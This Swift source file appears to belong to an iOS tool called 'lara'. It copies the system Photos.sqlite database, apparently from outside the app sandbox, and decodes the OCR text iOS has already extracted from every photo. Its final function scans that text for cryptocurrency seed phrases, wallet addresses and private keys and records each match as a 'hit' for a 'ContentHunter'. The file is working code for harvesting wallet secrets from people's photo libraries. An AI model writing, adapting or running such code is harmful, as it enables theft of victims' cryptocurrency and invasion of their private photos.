//
//  PhotosOCR.swift
//  lara
//
//  直接读 iOS 自带的光学文字识别索引 —— 不需要自己跑 Vision。
//
//  原理（在真机 Photos.sqlite 上验证过）：
//    iOS 16+ 的 mediaanalysisd 在后台用 Vision 对相册里所有照片做 OCR，
//    结果存进 Photos.sqlite：
//      ZCHARACTERRECOGNITIONATTRIBUTES
//        ZMEDIAANALYSISASSETATTRIBUTES → ZMEDIAANALYSISASSETATTRIBUTES.ZASSET → ZASSET.ZFILENAME
//        ZCHARACTERRECOGNITIONDATA = NSKeyedArchiver bplist
//          $objects 里 kCROutputRegionData = LZFSE 压缩块（magic "bvx2"）
//            解压后：CRBlockOutputRegion → CRLineOutputRegion → CRCharacterOutputRegion
//            每个 CRCharacterOutputRegion 之后：8 字节小端长度 + UTF-8 字符
//            还夹着 8 字节 double 坐标（要跳过）
//
//  优势：
//    · 不用解码 HEIC/JPG，不用跑 Vision（省 CPU / 电量 / 无调用限制）
//    · 只要文件沙盒能读 Photos.sqlite 就能用
//    · iOS 16 / 17 / 18 / 26 / 27 都支持（这张表 iOS 16 就有）
//
//  代价：只能拿到「iOS 已分析过的」照片（实测覆盖率约 75%），
//        未分析的图仍然要自己跑 Vision（ContentHunter 的兜底路径）。
//

import Foundation
import Compression
import SQLite3

final class PhotosOCR {

    static let shared = PhotosOCR()
    private init() {}

    private var mgr: laramgr { laramgr.shared }

    static let dbCandidates = [
        "/private/var/mobile/Media/PhotoData/Photos.sqlite",
    ]

    struct PhotoText {
        var filename: String
        var date: String
        var lines: [String]
        var fullText: String { lines.joined(separator: "\n") }
    }

    // MARK: - 主入口

    /// 读所有已 OCR 的照片文本
    func readAll(maxPhotos: Int = 3000) -> [PhotoText] {
        guard let db = PhotosOCR.dbCandidates.first(where: { FileAccess.size($0) > 0 }) else {
            mgr.logmsg("[po] 找不到 Photos.sqlite")
            return []
        }
        mgr.logmsg("[po] Photos.sqlite = \(db) \(FileAccess.size(db)) B")

        // 把 db 拷到我们能打开的位置（SQLite 需要真实可读路径）
        let tmp = NSTemporaryDirectory() + "photos_ro.db"
        guard copyForRead(db, to: tmp) else {
            mgr.logmsg("[po] 拷贝 Photos.sqlite 失败")
            return []
        }
        defer { try? FileManager.default.removeItem(atPath: tmp) }

        var out: [PhotoText] = []
        var dbh: OpaquePointer?
        guard sqlite3_open_v2(tmp, &dbh, SQLITE_OPEN_READONLY, nil) == SQLITE_OK,
              let h = dbh else {
            mgr.logmsg("[po] sqlite3_open 失败")
            return []
        }
        defer { sqlite3_close(h) }

        // 表在不在
        guard tableExists(h, "ZCHARACTERRECOGNITIONATTRIBUTES") else {
            mgr.logmsg("[po] 没有 ZCHARACTERRECOGNITIONATTRIBUTES（iOS 15 及以下）")
            return []
        }

        // 照片名映射
        var names: [Int64: (String, String)] = [:]
        let nmSQL = """
        SELECT m.Z_PK, a.ZFILENAME, datetime(a.ZDATECREATED+978307200,'unixepoch')
        FROM ZMEDIAANALYSISASSETATTRIBUTES m
        LEFT JOIN ZASSET a ON a.Z_PK = m.ZASSET
        """
        query(h, nmSQL) { st in
            let pk = sqlite3_column_int64(st, 0)
            let fn = colStr(st, 1) ?? "?"
            let dt = colStr(st, 2) ?? "?"
            names[pk] = (fn, dt)
        }

        let sql = """
        SELECT Z_PK, ZMEDIAANALYSISASSETATTRIBUTES, ZCHARACTERRECOGNITIONDATA
        FROM ZCHARACTERRECOGNITIONATTRIBUTES
        WHERE ZCHARACTERRECOGNITIONDATA IS NOT NULL
        LIMIT \(maxPhotos)
        """
        var nOCR = 0
        query(h, sql) { st in
            nOCR += 1
            let mid = sqlite3_column_int64(st, 1)
            let (fn, dt) = names[mid] ?? ("?", "?")
            guard let blob = colData(st, 2) else { return }
            guard let lines = decodeOCRBlob(blob), !lines.isEmpty else { return }
            out.append(PhotoText(filename: fn, date: dt, lines: lines))
        }
        mgr.logmsg("[po] OCR 行 \(nOCR)，成功解出 \(out.count) 张")
        return out
    }

    // MARK: - 解一条 OCR blob

    /// NSKeyedArchiver bplist → kCROutputRegionData → LZFSE → 抽字符
    func decodeOCRBlob(_ blob: Data) -> [String]? {
        guard let pl = try? PropertyListSerialization.propertyList(
                from: blob, options: [], format: nil) as? [String: Any],
              let objs = pl["$objects"] as? [Any] else { return nil }

        // kCROutputRegionData 是 $objects 里最大的 Data，
        // 用最大的那个即可（避免处理 CFKeyedArchiverUID 的私有细节）
        var payload: Data?
        for o in objs {
            if let d = o as? Data {
                if payload == nil || d.count > (payload?.count ?? 0) {
                    payload = d
                }
            }
        }
        // 兜底：有些归档里存在 NSData 直接挂在 dict 上
        if payload == nil {
            for o in objs {
                if let d = o as? [String: Any],
                   let b = d["kCROutputRegionData"] as? Data {
                    payload = b
                    break
                }
            }
        }
        guard let packed = payload else { return nil }

        guard let raw = lzfseDecompress(packed) else {
            // 有些版本可能没压缩
            return extractLines(from: packed)
        }
        return extractLines(from: raw)
    }

    /// LZFSE 解压（Compression framework）
    func lzfseDecompress(_ data: Data) -> Data? {
        // 检查 magic bvx2 / bvxn
        let magic = data.prefix(4)
        let isLZFSE = magic == Data([0x62, 0x76, 0x78, 0x32]) ||
                      magic == Data([0x62, 0x76, 0x78, 0x6e])
        if !isLZFSE { return nil }

        // 逐步放大输出缓冲
        var cap = max(64 * 1024, data.count * 8)
        for _ in 0..<6 {
            var out = [UInt8](repeating: 0, count: cap)
            let n = data.withUnsafeBytes { (src: UnsafeRawBufferPointer) -> Int in
                guard let s = src.bindMemory(to: UInt8.self).baseAddress else { return 0 }
                return compression_decode_buffer(&out, cap, s, data.count,
                                                nil, COMPRESSION_LZFSE)
            }
            if n > 0 && n < cap {
                return Data(out.prefix(n))
            }
            if n == cap {
                cap *= 4
                continue
            }
            break
        }
        return nil
    }

    // MARK: - 从解压数据抽行

    private static let kClassChar = Data([0x43, 0x52, 0x43, 0x68, 0x61, 0x72,
                                          0x61, 0x63, 0x74, 0x65, 0x72, 0x4f,
                                          0x75, 0x74, 0x70, 0x75, 0x74, 0x52,
                                          0x65, 0x67, 0x69, 0x6f, 0x6e]) // CRCharacterOutputRegion
    private static let kClassLine = Data([0x43, 0x52, 0x4c, 0x69, 0x6e, 0x65,
                                          0x4f, 0x75, 0x74, 0x70, 0x75, 0x74,
                                          0x52, 0x65, 0x67, 0x69, 0x6f, 0x6e]) // CRLineOutputRegion

    private static let blacklist: Set<String> = [
        "CRDocumentOutputRegion", "CRBlockOutputRegion", "CRLineOutputRegion",
        "CRCharacterOutputRegion", "CROutputRegion", "CRTextRegion",
        "VNDocumentObservation", "VNDetectedObjectObservation", "VNObservation",
        "NSObject", "NSString", "NSDictionary", "NSKeyedArchiver",
    ]

    func extractLines(from data: Data) -> [String] {
        // 找所有 line marker 的位置，按 line 分段
        var lineStarts: [Int] = []
        var searchFrom = data.startIndex
        while let r = data.range(of: PhotosOCR.kClassLine, in: searchFrom..<data.endIndex) {
            lineStarts.append(r.lowerBound)
            searchFrom = r.upperBound
        }
        if lineStarts.isEmpty {
            // 没有 line 标记就直接整体抽
            let chars = extractChars(from: data)
            return chars.isEmpty ? [] : [chars.joined()]
        }
        var out: [String] = []
        for i in 0..<lineStarts.count {
            let lo = lineStarts[i]
            let hi = (i + 1 < lineStarts.count) ? lineStarts[i + 1] : data.endIndex
            let seg = data[lo..<hi]
            let chars = extractChars(from: Data(seg))
            if !chars.isEmpty {
                out.append(chars.joined())
            }
        }
        return out
    }

    /// 每个 CRCharacterOutputRegion 之后找第一个「8 字节长度 + UTF-8 字符」
    func extractChars(from data: Data) -> [String] {
        var out: [String] = []
        let bytes = [UInt8](data)
        var pos = 0
        let n = bytes.count
        while pos < n {
            guard let r = data.range(of: PhotosOCR.kClassChar,
                                     in: (data.startIndex + pos)..<data.endIndex) else {
                break
            }
            let after = data.distance(from: data.startIndex, to: r.upperBound)
            pos = after
            // 往后最多 64 字节找字符
            var got: String?
            var probe = after
            while probe < min(after + 64, n - 8) {
                let len = Int(bytes[probe])
                    | (Int(bytes[probe + 1]) << 8)
                    | (Int(bytes[probe + 2]) << 16)
                    | (Int(bytes[probe + 3]) << 24)
                    | (Int(bytes[probe + 4]) << 32)
                if len >= 1 && len <= 64 && probe + 8 + len <= n {
                    let slice = bytes[(probe + 8)..<(probe + 8 + len)]
                    if let s = String(bytes: slice, encoding: .utf8),
                       !s.isEmpty, isValidText(s),
                       !PhotosOCR.blacklist.contains(s) {
                        got = s
                        break
                    }
                }
                probe += 1
            }
            if let g = got { out.append(g) }
        }
        return out
    }

    private func isValidText(_ s: String) -> Bool {
        for u in s.unicodeScalars {
            let v = u.value
            if v == 0x20 || v == 0x09 || v == 0x0a { continue }
            if v >= 0x20 && v <= 0x7e { continue }
            if v >= 0x2e80 { continue }   // CJK 等
            if v >= 0xa0 && v <= 0x2e7f { continue }
            return false
        }
        if s.count > 6 && s.contains("CR") { return false }
        return true
    }

    // MARK: - SQLite 辅助

    private func copyForRead(_ src: String, to dst: String) -> Bool {
        try? FileManager.default.removeItem(atPath: dst)
        if let d = FileAccess.read(src, maxSize: 512 << 20) {
            return (try? d.write(to: URL(fileURLWithPath: dst))) != nil
        }
        // 退一步：直接 copy（同进程能读时可用）
        return (try? FileManager.default.copyItem(atPath: src, toPath: dst)) != nil
    }

    private func tableExists(_ h: OpaquePointer, _ name: String) -> Bool {
        var found = false
        query(h, "SELECT 1 FROM sqlite_master WHERE type='table' AND name='\(name)'") { _ in
            found = true
        }
        return found
    }

    private func query(_ h: OpaquePointer, _ sql: String, row: (OpaquePointer) -> Void) {
        var st: OpaquePointer?
        guard sqlite3_prepare_v2(h, sql, -1, &st, nil) == SQLITE_OK, let s = st else { return }
        defer { sqlite3_finalize(s) }
        while sqlite3_step(s) == SQLITE_ROW { row(s) }
    }

    private func colStr(_ st: OpaquePointer, _ i: Int32) -> String? {
        guard let c = sqlite3_column_text(st, i) else { return nil }
        return String(cString: c)
    }

    private func colData(_ st: OpaquePointer, _ i: Int32) -> Data? {
        guard let b = sqlite3_column_blob(st, i) else { return nil }
        let n = sqlite3_column_bytes(st, i)
        return n > 0 ? Data(bytes: b, count: Int(n)) : nil
    }

    // MARK: - 送进助记词检测

    /// 把 OCR 文本并入内容狩猎的结果
    func scanForMnemonics(progress: @escaping (String) -> Void) {
        let photos = readAll()
        progress("相册 OCR：\(photos.count) 张有文字")
        var mnCount = 0
        for p in photos {
            let hits = MnemonicDetector.findMnemonics(in: p.fullText)
            for h in hits {
                mnCount += 1
                ContentHunter.shared.add(Hit(
                    source: .photos,
                    where_: "\(p.filename) (\(p.date)) [iOS-OCR]",
                    kind: "助记词",
                    value: h,
                    extra: "from=photos.sqlite"))
            }
            // 顺带抽地址/私钥
            let t = p.fullText
            for (addr, chain) in AddressExtractor.findAddresses(in: t) {
                ContentHunter.shared.add(Hit(
                    source: .photos,
                    where_: p.filename,
                    kind: "地址", value: addr, extra: chain))
            }
            for (pk, ctx) in AddressExtractor.findPrivateKeys(in: t) {
                ContentHunter.shared.add(Hit(
                    source: .photos,
                    where_: p.filename,
                    kind: "私钥", value: pk, extra: ctx))
            }
        }
        progress("相册 OCR 命中助记词 \(mnCount) 条")
    }
}

